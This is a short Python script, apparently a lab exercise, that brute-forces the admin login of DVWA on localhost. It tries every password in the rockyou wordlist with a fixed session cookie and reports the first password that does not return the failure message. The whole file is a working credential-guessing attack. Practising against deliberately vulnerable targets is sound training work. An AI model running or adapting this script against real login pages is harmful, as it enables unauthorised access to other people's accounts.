import requests 
from requests.utils import requote_uri
from bs4 import BeautifulSoup
from termcolor import colored

URL = "http://localhost:8080/DVWA-master/vulnerabilities/brute/?username=admin&password=%s&Login=Login#"

cookies = {"__stripe_mid": "37d68129-f74e-428b-90ce-72715d2b34fa","PHPSESSID": "jl8h4o0kvofc4nji8okhbjpc4e","security": "low"}

with open('../../rockyou.txt') as passwords:
    for password in passwords:
        res = requests.get(requote_uri(URL) % (password.strip()) , cookies=cookies)
        soup = BeautifulSoup(res.content , 'html.parser')
        if str(soup.pre) != "<pre><br/>Username and/or password incorrect.</pre>" :
            print(colored('[!] found password is  => %s' % (password) , 'green'))
            exit()


